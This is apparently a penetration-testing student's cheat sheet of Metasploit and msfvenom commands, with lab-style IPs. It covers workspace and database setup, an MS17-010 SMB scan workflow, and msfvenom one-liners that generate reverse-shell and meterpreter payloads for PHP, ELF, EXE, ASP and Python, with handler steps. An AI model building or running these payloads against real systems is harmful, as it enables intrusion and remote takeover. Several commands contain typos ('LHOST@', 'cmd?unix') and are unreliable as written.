Metasploit

systemctl start postgresql	initialize the database
msfdb init			initialize metasploit w/ the database
msfconsole			launch metasploit
db_status			check status
workspace			list available workspaces

$:options
workspace -a <WORKSPACE_NAME>	add workspace
workspace -d <WORKSPACE_NAME>	delete workspace
workspace			navigate between workspaces
workspace -h			list available options for the workspace command

help				databse backend commands menu
db_nmap	<option> <target_ip>	store results in the database
hosts				information relevant to the hosts running on target systems 
services			information relevant to the services running on target systems
hosts -h			help cmd
services -h			help cmd
hosts -R			to add the value to the RHOSTS parameter

Example Workflow:
use auxiliary/scanner/smb/smb_ms17_010
hosts -R <TARGET_IP>
show options
db_nmap
run / exploit (either or)

search
info
exploit
show payloads
set payload
show options
LHOST				needed for reverse shells
CTRL+Z
CTRL+C
sessions			list all active sessions
sessions -i <session_id>	select a session
sessions -h			show options menus

* msfvenom - Standalone CMD line exploit development
msfvenom -l payloads		show payloads
msfvenom -h			self explanatory
msfvenom --list formats		used to list supported output formats (windows exe etc)
-e <type>/<type>		encode
raw				output format
ex:
msfvenom -p php/meterpreter/reverse_tcp LHOST@10.10.186.44 -f raw -e php/base64

* msfvenom - handlers
using metasploit handler:
1. Generate the shell using MSFvenom
2. Start the Metasploit handler
3. Execute the PHP shell

ex 2:
msfvenom -p php/reverse_php LHOST@<LOCAL_IP> LPORT@<LOCAL_PORT> -f raw > reverse_shell.php
resulting file would be missing the starting/ending PHP tags and must be edited.
can be used with the use exploit/multi/handler
have ot set the LHOST and LPORT values

* msfvenom - linux executable and linkable format (elf)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf
> rev_shell.elf
elf format is an executable for Linux

Windows:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe

PHP:
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php

ASP:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp

Python:
msfvenom -p cmd?unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
